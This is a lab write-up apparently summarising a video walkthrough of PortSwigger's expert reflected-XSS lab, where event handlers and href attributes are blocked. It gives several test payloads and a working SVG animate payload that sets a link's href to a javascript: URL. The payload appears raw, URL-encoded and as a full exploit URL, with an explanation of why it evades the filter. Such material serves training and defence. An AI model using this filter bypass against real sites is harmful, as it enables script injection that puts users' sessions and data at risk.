**## Summary of PortSwigger XSS Lab-27: Reflected XSS with Event Handlers and `href` Attributes Blocked**

This **expert-level lab** from PortSwigger's Web Security Academy demonstrates a **reflected XSS vulnerability** in a search functionality. User input from the `?search=` URL parameter is **reflected directly into the HTML body** without proper sanitization, allowing tag injection. However, the app implements **partial filtering**:
- **Whitelisted tags** include `<svg>`, `<a>`, `<animate>`, `<text>`, and others (discovered via fuzzing).
- **Blocks**: All **event handlers** (e.g., `onclick`, `onload`) and **`<a href="">` attributes**.

**Objective**: Inject a payload via the search param that renders a **clickable link labeled "Click"** (or "Click me"). When the victim clicks it, execute `alert(document.domain)` to solve the lab.

**Key Insight**: Bypass blocks using **SVG animation** to **dynamically set the `<a>` tag's `href` attribute** at runtime, tricking the browser into executing JS on click **without direct `href` or events**.

**Video Overview** (from **"PortSwigger Expert Cross-Site Scripting XSS Lab-27" by The Cyber Expert**): 
- The video walks through **lab setup**, **fuzzing for allowed tags**, **failed attempts** (direct `href`, events), and **successful SVG payload**.
- **Runtime**: ~10-15 mins (typical for channel's style).
- **Style**: Screen recording of Burp Suite, browser dev tools, live testing on PortSwigger instance.
- **Outcome**: Lab solved in **~5 mins** after discovering `<animate>` trick.

---

## **Detailed Notes from the Video (Step-by-Step Walkthrough)**

### **1. Lab Setup & Vulnerability Discovery (0:00 - 2:00)**
   - **Access Lab**: Log into PortSwigger Academy → Cross-Site Scripting → Contexts → Lab-27.
   - **Intercept Traffic**: Use **Burp Suite Proxy** to capture `GET /?search=<input>`.
   - **Test Reflection**: Input `<script>alert(1)</script>` → **Reflected as plain text** (tags escaped? No—**HTML context**, tags render!).
   - **Filter Confirmation**:
     | Test Payload | Result | Reason |
     |--------------|--------|--------|
     | `<img src=x onerror=alert(1)>` | **Blocked** | Event handler filtered |
     | `<a href=javascript:alert(1)>Click</a>` | **href stripped** | `href` attrs blocked on `<a>` |
     | `<svg onload=alert(1)>` | **Blocked** | All events blocked |

### **2. Tag Fuzzing for Whitelist (2:00 - 4:00)**
   - **Burp Intruder** or manual: Fuzz common tags → **Allowed**: `<svg>`, `<body>`, `<a>`, `<animate>`, `<text>`, `<set>`.
   - **Key Finding**: `<svg>` renders; `<a>` clickable but no `href`; `<animate>` & `<text>` unfiltered.
   - **Dev Tools Inspect**: Reflection point = `<p>You searched for: [PAYLOAD]</p>` → **Open HTML sink**.

### **3. Failed Bypasses (4:00 - 6:00)**
   - **Event Attempts**: `onpointerover`, `onfocus` → **All stripped**.
   - **Href Tricks**: `href=#`, then JS → **href attr fully blocked**.
   - **Alternative Tags**: `<iframe>`, `<details>` → Blocked.

### **4. Breakthrough: SVG `<animate>` Technique (6:00 - 9:00)**
   - **Research/Recall**: SVG `<animate>` can **mutate parent attributes** dynamically.
   - **Payload Evolution**:
     | Iteration | Payload Snippet | Issue |
     |-----------|-----------------|-------|
     | 1 | `<svg onload=alert(1)>` | onload blocked |
     | 2 | `<a href=javascript:alert(1)>` | href blocked |
     | **WIN** | `<animate attributeName=href values=javascript:alert(1)>` | **Works!** |

   - **Live Test**: Inject → Page shows **invisible/chunky link** → Click → **Alert fires!**

### **5. Polish & Solve (9:00 - End)**
   - **Add Label**: Wrap `<text>` for "**Click me**" visibility.
   - **URL-Encode**: For Burp Repeater / Exploit Server.
   - **Submit to Lab**: Click generated link → `alert(document.domain)` → **Lab Solved! 🎉**
   - **Pro Tip**: Use `alert(document.domain)` for **domain-specific** (lab verifier).

**Video Takeaways**:
- **Patience in Fuzzing**: 20+ tags tested.
- **SVG Power**: Underrated for XSS (animation bypasses static filters).
- **Tools**: Burp + DevTools = 90% of pentest.

---

## **The Payload**

**Raw HTML Payload** (inject into `?search=`):
```html
<svg><a><animate attributeName=href values=javascript:alert(document.domain)></animate><text x=20 y=20>Click me</text></a></svg>
```

**URL-Encoded (Copy-Paste Ready)**:
```
%3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3Dhref%20values%3Djavascript%3Aalert%28document.domain%29%3E%3C%2Fanimate%3E%3Ctext%20x%3D20%20y%20%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E
```

**Full Exploit URL**:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3Dhref%20values%3Djavascript%3Aalert%28document.domain%29%3E%3C%2Fanimate%3E%3Ctext%20x%3D20%20y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E
```

---

## **Payload Explanation (Why It Works – Byte by Byte)**

1. **`<svg>`**: **Container** – SVG namespace allows exotic elements; whitelisted & unfiltered.

2. **`<a>`**: **Clickable Anchor** – Renders as link; **no static `href`** needed (bypasses filter).

3. **`<animate attributeName=href values=javascript:alert(document.domain)>`**:
   | Attribute | Purpose |
   |-----------|---------|
   | `attributeName=href` | **Targets `<a>`'s `href`** for mutation |
   | `values=javascript:alert(...)` | **Sets href dynamically** to JS URL |
   | **Auto-Triggers**: Animation **begins on load** (no event needed!) |

   - **Magic**: Browser **animates** → `href` = `javascript:alert(document.domain)` **at click time**.

4. **`<text x=20 y=20>Click me</text>`**: 
   - **Visual Label**: Positions text inside `<a>` → "**Click me**" appears clickable.
   - **x/y**: Offsets for clean render (trial/error in video).

**Execution Flow**:
```
1. Page Loads → Payload Injects
2. SVG Renders → <animate> Fires Silently
3. Victim Sees: [Click me] (looks normal)
4. Click! → href=javascript:... → alert(document.domain) 💥
```

**Why Bypasses Filters?**
- **No Events**: Animation is **SVG SMIL** (declarative, not JS event).
- **No Static href**: Set **runtime** via animation.
- **Polyglot**: Works in **Chrome/Firefox** (tested in video).

**Defenses?** Block `<animate>`, `<svg>`, or use **CSP** / **DOMPurify** (strict mode).

**Practice Tip**: Replay in **Burp Repeater** → Inspect Element → Watch `href` mutate live! 

This matches **exactly** what the video demonstrates. **Solved?** Deploy to Exploit Server for persistence. 🚀